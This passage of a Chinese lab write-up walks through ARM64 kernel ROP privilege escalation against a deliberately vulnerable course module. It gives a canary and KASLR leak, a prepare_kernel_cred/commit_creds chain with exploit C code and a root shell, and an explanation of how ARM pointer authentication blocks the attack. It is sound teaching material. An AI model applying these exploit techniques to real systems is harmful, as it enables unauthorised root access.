+</span></span></code></pre></td></tr></table></div></div><p><img src=/p/rop/image-20230529215904015.png width=429 height=275 srcset="/p/rop/image-20230529215904015_hue72d13ea232307be7b98e6e1d90b8e06_14839_480x0_resize_box_3.png 480w, /p/rop/image-20230529215904015_hue72d13ea232307be7b98e6e1d90b8e06_14839_1024x0_resize_box_3.png 1024w" loading=lazy alt="image 7" class=gallery-image data-flex-grow=156 data-flex-basis=374px></p><p>flag：sysde655sEc</p><h2 id=task3-rop-获取-root-权限>Task3: ROP 获取 root 权限</h2><ol><li>这次我们需要使用ROP进行提权，函数调用栈为</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span><span class=lnt>9
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=n>zjubof_write4</span> <span class=o>-&gt;</span> <span class=n>zjubof_write3</span><span class=o>-&gt;</span><span class=n>prepare_kernel_cred</span><span class=o>-&gt;</span><span class=n>commit_creds</span><span class=o>-&gt;</span><span class=n>second_level_gadget</span>
+</span></span><span class=line><span class=cl><span class=n>into</span> <span class=nl>zjubof_write3</span><span class=p>:</span> <span class=n>sp</span> <span class=o>=</span> <span class=n>sp</span> <span class=o>-</span> <span class=mi>32</span>
+</span></span><span class=line><span class=cl><span class=n>leave</span> <span class=nl>zjubof_write3</span><span class=p>:</span> <span class=n>sp</span> <span class=o>=</span> <span class=n>sp</span> <span class=o>+</span> <span class=mi>32</span>
+</span></span><span class=line><span class=cl><span class=n>into</span> <span class=nl>prepare_kernel_cred</span><span class=p>:</span> <span class=n>sp</span> <span class=o>=</span> <span class=n>sp</span> <span class=o>-</span> <span class=mi>32</span>
+</span></span><span class=line><span class=cl><span class=n>leave</span> <span class=nl>prepare_kernel_cred</span><span class=p>:</span> <span class=n>sp</span> <span class=o>=</span> <span class=n>sp</span> <span class=o>+</span> <span class=mi>32</span>
+</span></span><span class=line><span class=cl><span class=n>into</span> <span class=nl>commit_creds</span><span class=p>:</span> <span class=n>sp</span> <span class=o>=</span> <span class=n>sp</span> <span class=o>-</span> <span class=mi>48</span>
+</span></span><span class=line><span class=cl><span class=n>leave</span> <span class=nl>commit_creds</span><span class=p>:</span> <span class=n>sp</span> <span class=o>=</span> <span class=n>sp</span> <span class=o>+</span> <span class=mi>48</span>
+</span></span><span class=line><span class=cl><span class=n>into</span> <span class=nl>second_level_gadget</span><span class=p>:</span> <span class=n>sp</span> <span class=o>=</span> <span class=n>sp</span>
+</span></span><span class=line><span class=cl><span class=n>leave</span> <span class=nl>second_level_gadget</span><span class=p>:</span> <span class=n>sp</span> <span class=o>=</span> <span class=n>sp</span> <span class=o>+</span> <span class=mi>464</span>
+</span></span></code></pre></td></tr></table></div></div><ol start=2><li>根据函数调用栈，得到栈布局</li></ol><p><img src=/p/rop/image-20230530014157017.png width=885 height=1139 srcset="/p/rop/image-20230530014157017_hu4a1d69c8930bbac0ac62fe299df7bf06_175373_480x0_resize_box_3.png 480w, /p/rop/image-20230530014157017_hu4a1d69c8930bbac0ac62fe299df7bf06_175373_1024x0_resize_box_3.png 1024w" loading=lazy alt="image 8" class=gallery-image data-flex-grow=77 data-flex-basis=186px></p><ol start=3><li>构造buffer如下</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=n>buf</span><span class=p>.</span><span class=n>length</span> <span class=o>=</span> <span class=mi>160</span> <span class=o>+</span> <span class=mi>1</span> <span class=p>(</span><span class=mi>160</span> <span class=n>B</span> <span class=o>+</span> <span class=sc>&#39;\0&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>buf</span><span class=p>[</span><span class=mi>24</span> <span class=p>...</span> <span class=mi>30</span><span class=p>]</span> <span class=o>=</span> <span class=n>canary</span>
+</span></span><span class=line><span class=cl><span class=n>buf</span><span class=p>[</span><span class=mi>40</span> <span class=p>...</span> <span class=mi>48</span><span class=p>]</span> <span class=o>=</span> <span class=n>RA</span> <span class=n>of</span> <span class=n>prepare_kernel_cred</span>
+</span></span><span class=line><span class=cl><span class=n>buf</span><span class=p>[</span><span class=mi>72</span> <span class=p>...</span> <span class=mi>80</span><span class=p>]</span> <span class=o>=</span> <span class=n>RA</span> <span class=n>of</span> <span class=n>commit_creds</span>
+</span></span><span class=line><span class=cl><span class=n>buf</span><span class=p>[</span><span class=mi>104</span> <span class=p>...</span> <span class=mi>112</span><span class=p>]</span> <span class=o>=</span> <span class=n>RA</span> <span class=n>of</span> <span class=n>second_level_gadget</span>
+</span></span><span class=line><span class=cl><span class=n>buf</span><span class=p>[</span><span class=mi>152</span> <span class=p>...</span> <span class=mi>160</span><span class=p>]</span> <span class=o>=</span> <span class=n>RA</span> <span class=n>of</span> <span class=n>zjubof_write</span>
+</span></span></code></pre></td></tr></table></div></div><p>各个ROP的跳转地址分别为：</p><p>RA of prepare_kernel_cred: 0xffff8000100a6214</p><p><img src=/p/rop/image-20230530014732806.png width=679 height=301 srcset="/p/rop/image-20230530014732806_hudc7f838a89b5fe1b3ffdc4bcaac19c78_52123_480x0_resize_box_3.png 480w, /p/rop/image-20230530014732806_hudc7f838a89b5fe1b3ffdc4bcaac19c78_52123_1024x0_resize_box_3.png 1024w" loading=lazy alt="image 9" class=gallery-image data-flex-grow=225 data-flex-basis=541px></p><p>RA of commit_creds: 0xffff8000100a5f6c</p><p><img src=/p/rop/image-20230530014820517.png width=690 height=298 srcset="/p/rop/image-20230530014820517_hu1e291eaad6f027d7cb99a8904b45b093_48571_480x0_resize_box_3.png 480w, /p/rop/image-20230530014820517_hu1e291eaad6f027d7cb99a8904b45b093_48571_1024x0_resize_box_3.png 1024w" loading=lazy alt="image 10" class=gallery-image data-flex-grow=231 data-flex-basis=555px></p><p>RA of second_level_gadget: 0xffff8000107abdb0（因为第一条指令不改变sp，因此可以直接跳 ）</p><p><img src=/p/rop/image-20230530014929574.png width=559 height=138 srcset="/p/rop/image-20230530014929574_hu1e227605a560464adff1d70b820cdcb3_12118_480x0_resize_box_3.png 480w, /p/rop/image-20230530014929574_hu1e227605a560464adff1d70b820cdcb3_12118_1024x0_resize_box_3.png 1024w" loading=lazy alt="image 11" class=gallery-image data-flex-grow=405 data-flex-basis=972px></p><p>RA of zjubof_write: 0xffff8000107abe54</p><p><img src=/p/rop/image-20230530015026018.png width=641 height=228 srcset="/p/rop/image-20230530015026018_hube20c14d19f4606e445fc5155efa7ce2_39065_480x0_resize_box_3.png 480w, /p/rop/image-20230530015026018_hube20c14d19f4606e445fc5155efa7ce2_39065_1024x0_resize_box_3.png 1024w" loading=lazy alt="image 12" class=gallery-image data-flex-grow=281 data-flex-basis=674px></p><ol start=4><li>关键代码及结果</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>void</span> <span class=nf>hackUsingROP</span><span class=p>(</span><span class=kt>int</span> <span class=n>fd</span><span class=p>,</span> <span class=kt>size_t</span> <span class=n>offset</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=kt>char</span> <span class=n>buf</span><span class=p>[</span><span class=mi>161</span><span class=p>];</span>
+</span></span><span class=line><span class=cl>    <span class=nf>memset</span><span class=p>(</span><span class=n>buf</span><span class=p>,</span> <span class=sc>&#39;\0&#39;</span><span class=p>,</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>buf</span><span class=p>));</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=nf>memcpy</span><span class=p>(</span><span class=n>buf</span> <span class=o>+</span> <span class=mi>24</span><span class=p>,</span> <span class=n>canaryStr</span><span class=p>,</span> <span class=mi>8</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=kt>size_t</span> <span class=n>prepareKernelCredRA</span> <span class=o>=</span> <span class=n>RAOfPrepareKernelCred</span> <span class=o>+</span> <span class=n>offset</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=nf>memcpy</span><span class=p>(</span><span class=n>buf</span> <span class=o>+</span> <span class=mi>40</span><span class=p>,</span> <span class=p>(</span><span class=kt>char</span><span class=o>*</span><span class=p>)</span><span class=o>&amp;</span><span class=n>prepareKernelCredRA</span><span class=p>,</span> <span class=mi>8</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=kt>size_t</span> <span class=n>commitCredsRA</span> <span class=o>=</span> <span class=n>RAOfCommitCreds</span> <span class=o>+</span> <span class=n>offset</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=nf>memcpy</span><span class=p>(</span><span class=n>buf</span> <span class=o>+</span> <span class=mi>72</span><span class=p>,</span> <span class=p>(</span><span class=kt>char</span><span class=o>*</span><span class=p>)</span><span class=o>&amp;</span><span class=n>commitCredsRA</span><span class=p>,</span> <span class=mi>8</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=kt>size_t</span> <span class=n>secondLevelGadgetRA</span> <span class=o>=</span> <span class=n>RAOfSecondLevelGadget</span> <span class=o>+</span> <span class=n>offset</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=nf>memcpy</span><span class=p>(</span><span class=n>buf</span> <span class=o>+</span> <span class=mi>104</span><span class=p>,</span> <span class=p>(</span><span class=kt>char</span><span class=o>*</span><span class=p>)</span><span class=o>&amp;</span><span class=n>secondLevelGadgetRA</span><span class=p>,</span> <span class=mi>8</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=kt>size_t</span> <span class=n>ZJUBofWriteRA</span> <span class=o>=</span> <span class=n>RAOfZJUBofWrite</span> <span class=o>+</span> <span class=n>offset</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=nf>memcpy</span><span class=p>(</span><span class=n>buf</span> <span class=o>+</span> <span class=mi>152</span><span class=p>,</span> <span class=p>(</span><span class=kt>char</span><span class=o>*</span><span class=p>)</span><span class=o>&amp;</span><span class=n>ZJUBofWriteRA</span><span class=p>,</span> <span class=mi>8</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=nf>write</span><span class=p>(</span><span class=n>fd</span><span class=p>,</span> <span class=n>buf</span><span class=p>,</span> <span class=mi>160</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    
+</span></span><span class=line><span class=cl>    <span class=nf>system</span><span class=p>(</span><span class=s>&#34;/bin/sh&#34;</span><span class=p>);</span> 
+</span></span><span class=line><span class=cl>    
+</span></span><span class=line><span class=cl>    <span class=k>return</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><p><img src=/p/rop/image-20230530012657947.png width=419 height=277 srcset="/p/rop/image-20230530012657947_hu9b906c3777cccf150df819fa48544bad_14826_480x0_resize_box_3.png 480w, /p/rop/image-20230530012657947_hu9b906c3777cccf150df819fa48544bad_14826_1024x0_resize_box_3.png 1024w" loading=lazy alt="image 13" class=gallery-image data-flex-grow=151 data-flex-basis=363px></p><p>flag：sysde655sEc</p><h2 id=task4-linux内核对-rop-攻击的防护>Task4: Linux内核对 ROP 攻击的防护</h2><ol><li>编译运行，之后执行exp</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># 编译内核</span>
+</span></span><span class=line><span class=cl><span class=nb>export</span> <span class=nv>ARCH</span><span class=o>=</span>arm64
+</span></span><span class=line><span class=cl>make <span class=nv>CROSS_COMPILE</span><span class=o>=</span>aarch64-linux-gnu- defconfig
+</span></span><span class=line><span class=cl>make <span class=nv>CROSS_COMPILE</span><span class=o>=</span>aarch64-linux-gnu- menuconfig
+</span></span><span class=line><span class=cl>make <span class=nv>CROSS_COMPILE</span><span class=o>=</span>aarch64-linux-gnu- -j<span class=k>$(</span>nproc<span class=k>)</span>
+</span></span><span class=line><span class=cl><span class=c1># 将vmlinux精简成Image</span>
+</span></span><span class=line><span class=cl>aarch64-linux-gnu-objcopy -O binary vmlinux Image --strip-all
+</span></span><span class=line><span class=cl>./start.sh
+</span></span></code></pre></td></tr></table></div></div><p>发现出现段错误</p><p><img src=/p/rop/image-20230530191216896.png width=599 height=960 srcset="/p/rop/image-20230530191216896_hue0db8aec13802586289bcf9a826fefc3_58948_480x0_resize_box_3.png 480w, /p/rop/image-20230530191216896_hue0db8aec13802586289bcf9a826fefc3_58948_1024x0_resize_box_3.png 1024w" loading=lazy alt="image 14" class=gallery-image data-flex-grow=62 data-flex-basis=149px></p><ol start=2><li>查看汇编代码，发现相比之前多了<code>paciasp</code>和<code>autiasp</code>这两个指令</li></ol><p><img src=/p/rop/image-20230530191355426.png width=704 height=920 srcset="/p/rop/image-20230530191355426_hu80b22562d138cbf17922264dfeb87403_156375_480x0_resize_box_3.png 480w, /p/rop/image-20230530191355426_hu80b22562d138cbf17922264dfeb87403_156375_1024x0_resize_box_3.png 1024w" loading=lazy alt="image 15" class=gallery-image data-flex-grow=76 data-flex-basis=183px></p><p>这两个指令由ARM PA机制引入，这是一种指针认证的方式。其通过在存储指针之前向未使用的高位添加加密签名来工作，这也被称为指针认证码（PAC）。<code>paciasp</code>用于在存储指针值之前生成并插入指针认证代码（PAC），而<code>autiasp</code>则用于在从内存读回后验证并删除指针值中的PAC。这种机制可以保证在写入和读取指针之间对指针值的任何更改都会使签名无效，进而CPU会将身份验证失败解释为内存损坏，并设置指针中的高位，使该指针无效并导致应用程序崩溃。</p><p><img src=/p/rop/image-20230530183831260.png width=982 height=317 srcset="/p/rop/image-20230530183831260_hu094ed7f3d136e8e32b06af09533db3cc_132358_480x0_resize_box_3.png 480w, /p/rop/image-20230530183831260_hu094ed7f3d136e8e32b06af09533db3cc_132358_1024x0_resize_box_3.png 1024w" loading=lazy alt="image 16" class=gallery-image data-flex-grow=309 data-flex-basis=743px></p><p>总结来说，在进入函数的时候，栈上存储的不再是返回地址，而是附带着加密后的返回地址，在离开函数时会校验这个地址的合法性，如果合法即未被篡改函数才能正常返回；同时由于攻击者无法得知密钥以及加密算法，因此攻击者无法构造出加密后的返回地址进行<code>buffer overflow</code>，也就无法进行 ROP 攻击</p><h2 id=思考题>思考题</h2><ol><li>为什么linux canary的最低位byte总是 <code>\00</code>？</li></ol><p>保证内存对齐，可以提高内存访问效率；同时可以将其当做字符串的终止符，防止canary的泄露</p><ol start=2><li>在ARM64的ROP中，在 <code>zjubof_write4</code>中overflow覆盖到的返回地址，会在 什么时候/执行到哪个函数哪一行的时候被load到pc寄存器？</li></ol><p>会在<code>zjubof_write3</code>的<code>return 0;</code>，也就是在<code>zjubof_write3</code>汇编的<code>ldp x29, x30, [sp], #32</code>行，<code>x29</code>和<code>x30</code>被更新，然后执行<code>ret</code>时load到pc寄存器</p><ol start=3><li>在Task2中，为什么在exp中直接覆盖返回地址为 <code>first_level_gadget</code> 的汇编第一行地址，会造成kernel在运行到这一行的时候产生panic？并写出造成这个panic的触发链</li></ol><p>当跳转到<code>first_level_gadget</code>且尚未执行其中的汇编时，栈空间如下所示</p><p><img src=/p/rop/image-20230530181212838.png width=791 height=305 srcset="/p/rop/image-20230530181212838_hu499750c5f631cff84c08e675253c5c6e_28269_480x0_resize_box_3.png 480w, /p/rop/image-20230530181212838_hu499750c5f631cff84c08e675253c5c6e_28269_1024x0_resize_box_3.png 1024w" loading=lazy alt="image 17" class=gallery-image data-flex-grow=259 data-flex-basis=622px></p><p>此时<code>zjubof_write3</code>和<code>zjubof_write4</code>部分的栈空间已经被释放，可以看到<code>sp</code>已经指向了栈底，同时<code>x29</code>和<code>x30</code>寄存器的值已经是被正确压栈了，此时我们如果跳到第一行，则又会将<code>x29和x30</code>压栈，而此时的<code>x29</code>和<code>x30</code>寄存器保存的是<code>first_level_gadget</code>的中的返回地址和旧栈帧，也就是下面这样</p><p><img src=/p/rop/image-20230530181128956.png width=826 height=424 srcset="/p/rop/image-20230530181128956_hu40b8484df6a8b2c7955cc8417f6f8256_43892_480x0_resize_box_3.png 480w, /p/rop/image-20230530181128956_hu40b8484df6a8b2c7955cc8417f6f8256_43892_1024x0_resize_box_3.png 1024w" loading=lazy alt="image 18" class=gallery-image data-flex-grow=194 data-flex-basis=467px></p><p>当<code>first_level_gadget</code>执行完成后，会首先更新<code>x29</code>和<code>x30</code>，正常情况下会跳回<code>zjubof_write1</code>，并将<code>sp+220</code>进而恢复<code>sp</code>，而现在则会再次跳到<code>first_level_gadget</code>，同时<code>sp+220</code>也会更新到错误的地方，之后就是重复的再次跳到<code>first_level_gadget</code>，同时<code>sp+220</code>错误的更新，直到stack overflow</p><ol start=4><li>Linux 内核是如何利用 ARM PA 来防御 ROP 攻击的</li></ol><p>见Task4中的分析</p><p>附exp.c完整代码：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
+</span><span class=lnt>  2
+</span><span class=lnt>  3
+</span><span class=lnt>  4
+</span><span class=lnt>  5
+</span><span class=lnt>  6
+</span><span class=lnt>  7
+</span><span class=lnt>  8
+</span><span class=lnt>  9
+</span><span class=lnt> 10
+</span><span class=lnt> 11
+</span><span class=lnt> 12
+</span><span class=lnt> 13
+</span><span class=lnt> 14
+</span><span class=lnt> 15
+</span><span class=lnt> 16
+</span><span class=lnt> 17
+</span><span class=lnt> 18
+</span><span class=lnt> 19
+</span><span class=lnt> 20
+</span><span class=lnt> 21
+</span><span class=lnt> 22
+</span><span class=lnt> 23
+</span><span class=lnt> 24
+</span><span class=lnt> 25
+</span><span class=lnt> 26
+</span><span class=lnt> 27
+</span><span class=lnt> 28
+</span><span class=lnt> 29
+</span><span class=lnt> 30
+</span><span class=lnt> 31
+</span><span class=lnt> 32
+</span><span class=lnt> 33
+</span><span class=lnt> 34
+</span><span class=lnt> 35
+</span><span class=lnt> 36
+</span><span class=lnt> 37
+</span><span class=lnt> 38
+</span><span class=lnt> 39
+</span><span class=lnt> 40
+</span><span class=lnt> 41
+</span><span class=lnt> 42
+</span><span class=lnt> 43
+</span><span class=lnt> 44
+</span><span class=lnt> 45
+</span><span class=lnt> 46
+</span><span class=lnt> 47
+</span><span class=lnt> 48
+</span><span class=lnt> 49
+</span><span class=lnt> 50
+</span><span class=lnt> 51
+</span><span class=lnt> 52
+</span><span class=lnt> 53
+</span><span class=lnt> 54
+</span><span class=lnt> 55
+</span><span class=lnt> 56
+</span><span class=lnt> 57
+</span><span class=lnt> 58
+</span><span class=lnt> 59
+</span><span class=lnt> 60
+</span><span class=lnt> 61
+</span><span class=lnt> 62
+</span><span class=lnt> 63
+</span><span class=lnt> 64
+</span><span class=lnt> 65
+</span><span class=lnt> 66
+</span><span class=lnt> 67
+</span><span class=lnt> 68
+</span><span class=lnt> 69
+</span><span class=lnt> 70
+</span><span class=lnt> 71
+</span><span class=lnt> 72
+</span><span class=lnt> 73
+</span><span class=lnt> 74
+</span><span class=lnt> 75
+</span><span class=lnt> 76
+</span><span class=lnt> 77
+</span><span class=lnt> 78
+</span><span class=lnt> 79
+</span><span class=lnt> 80
+</span><span class=lnt> 81
+</span><span class=lnt> 82
+</span><span class=lnt> 83
+</span><span class=lnt> 84
+</span><span class=lnt> 85
+</span><span class=lnt> 86
+</span><span class=lnt> 87
+</span><span class=lnt> 88
+</span><span class=lnt> 89
+</span><span class=lnt> 90
+</span><span class=lnt> 91
+</span><span class=lnt> 92
+</span><span class=lnt> 93
+</span><span class=lnt> 94
+</span><span class=lnt> 95
+</span><span class=lnt> 96
+</span><span class=lnt> 97
+</span><span class=lnt> 98
+</span><span class=lnt> 99
+</span><span class=lnt>100
+</span><span class=lnt>101
+</span><span class=lnt>102
+</span><span class=lnt>103
+</span><span class=lnt>104
+</span><span class=lnt>105
+</span><span class=lnt>106
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
+</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
+</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;string.h&gt;</span><span class=cp>
+</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;unistd.h&gt;</span><span class=cp>
+</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;sys/stat.h&gt;</span><span class=cp>
+</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;sys/types.h&gt;</span><span class=cp>
+</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;fcntl.h&gt;</span><span class=cp>
+</span></span></span><span class=line><span class=cl><span class=cp></span>
+</span></span><span class=line><span class=cl><span class=k>const</span> <span class=kt>size_t</span> <span class=n>RAWithoutKASLR</span> <span class=o>=</span> <span class=mh>0xffff800010de7d0c</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=k>const</span> <span class=kt>size_t</span> <span class=n>RAToFirstLevelGadget</span> <span class=o>=</span> <span class=mh>0xffff8000107abd7c</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>const</span> <span class=kt>size_t</span> <span class=n>RAOfPrepareKernelCred</span> <span class=o>=</span> <span class=mh>0xffff8000100a6214</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=k>const</span> <span class=kt>size_t</span> <span class=n>RAOfCommitCreds</span> <span class=o>=</span> <span class=mh>0xffff8000100a5f6c</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=k>const</span> <span class=kt>size_t</span> <span class=n>RAOfSecondLevelGadget</span> <span class=o>=</span> <span class=mh>0xffff8000107abdb0</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=k>const</span> <span class=kt>size_t</span> <span class=n>RAOfZJUBofWrite</span> <span class=o>=</span> <span class=mh>0xffff8000107abe54</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=kt>char</span> <span class=n>canaryStr</span><span class=p>[</span><span class=mi>8</span><span class=p>];</span>
+</span></span><span class=line><span class=cl><span class=kt>char</span> <span class=n>oldFPStr</span><span class=p>[</span><span class=mi>8</span><span class=p>];</span> <span class=c1>// fp of zjubof_write2 
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=kt>char</span> <span class=n>oldRAStr</span><span class=p>[</span><span class=mi>8</span><span class=p>];</span> <span class=c1>// ra of zjubof_write3 -&gt; zjubof_write2
+</span></span></span><span class=line><span class=cl><span class=c1></span>
+</span></span><span class=line><span class=cl><span class=kt>size_t</span> <span class=nf>getOffset</span><span class=p>(</span><span class=kt>int</span> <span class=n>fd</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=kt>size_t</span> <span class=n>len</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> 
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=kt>char</span> <span class=n>buf</span><span class=p>[</span><span class=mi>49</span><span class=p>]</span> <span class=o>=</span> <span class=s>&#34;0123456789ABCDEF</span><span class=se>\x30</span><span class=s>&#34;</span><span class=p>;</span> <span class=c1>// cmd.command = &#34;0123456789ABCDEF&#34;, cmd.length = 0x30
+</span></span></span><span class=line><span class=cl><span class=c1></span>
+</span></span><span class=line><span class=cl>    <span class=n>len</span> <span class=o>=</span> <span class=nf>write</span><span class=p>(</span><span class=n>fd</span><span class=p>,</span> <span class=n>buf</span><span class=p>,</span> <span class=mi>24</span><span class=p>);</span> <span class=c1>// // 16 + 8 B
+</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>len</span> <span class=o>=</span> <span class=nf>read</span><span class=p>(</span><span class=n>fd</span><span class=p>,</span> <span class=n>buf</span><span class=p>,</span> <span class=mi>48</span><span class=p>);</span> <span class=c1>// CMD_LENGTH = 49, len &lt; 49
+</span></span></span><span class=line><span class=cl><span class=c1></span>
+</span></span><span class=line><span class=cl>    
+</span></span><span class=line><span class=cl>    <span class=nf>memset</span><span class=p>(</span><span class=n>canaryStr</span><span class=p>,</span> <span class=sc>&#39;\0&#39;</span><span class=p>,</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>canaryStr</span><span class=p>));</span>
+</span></span><span class=line><span class=cl>    <span class=nf>memcpy</span><span class=p>(</span><span class=n>canaryStr</span><span class=p>,</span> <span class=n>buf</span><span class=o>+</span><span class=mi>24</span><span class=p>,</span> <span class=mi>8</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    
+</span></span><span class=line><span class=cl>    <span class=nf>memset</span><span class=p>(</span><span class=n>oldFPStr</span><span class=p>,</span> <span class=sc>&#39;\0&#39;</span><span class=p>,</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>oldFPStr</span><span class=p>));</span>
+</span></span><span class=line><span class=cl>    <span class=nf>memcpy</span><span class=p>(</span><span class=n>oldFPStr</span><span class=p>,</span> <span class=n>buf</span><span class=o>+</span><span class=mi>32</span><span class=p>,</span> <span class=mi>8</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=nf>memset</span><span class=p>(</span><span class=n>oldRAStr</span><span class=p>,</span> <span class=sc>&#39;\0&#39;</span><span class=p>,</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>oldRAStr</span><span class=p>));</span>
+</span></span><span class=line><span class=cl>    <span class=nf>memcpy</span><span class=p>(</span><span class=n>oldRAStr</span><span class=p>,</span> <span class=n>buf</span><span class=o>+</span><span class=mi>40</span><span class=p>,</span> <span class=mi>8</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=kt>size_t</span> <span class=n>canary</span> <span class=o>=</span> <span class=o>*</span><span class=p>(</span><span class=kt>size_t</span> <span class=o>*</span><span class=p>)</span> <span class=n>canaryStr</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=kt>size_t</span> <span class=n>oldFP</span> <span class=o>=</span> <span class=o>*</span><span class=p>(</span><span class=kt>size_t</span> <span class=o>*</span><span class=p>)</span> <span class=n>oldFPStr</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=kt>size_t</span> <span class=n>oldRA</span> <span class=o>=</span> <span class=o>*</span><span class=p>(</span><span class=kt>size_t</span> <span class=o>*</span><span class=p>)</span> <span class=n>oldRAStr</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;canary = 0x%lx</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>canary</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;oldFP = 0x%lx</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>oldFP</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;oldRA = 0x%lx</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>oldRA</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=kt>size_t</span> <span class=n>offset</span> <span class=o>=</span> <span class=n>oldRA</span> <span class=o>-</span> <span class=n>RAWithoutKASLR</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;offset = 0x%lx</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>offset</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>offset</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
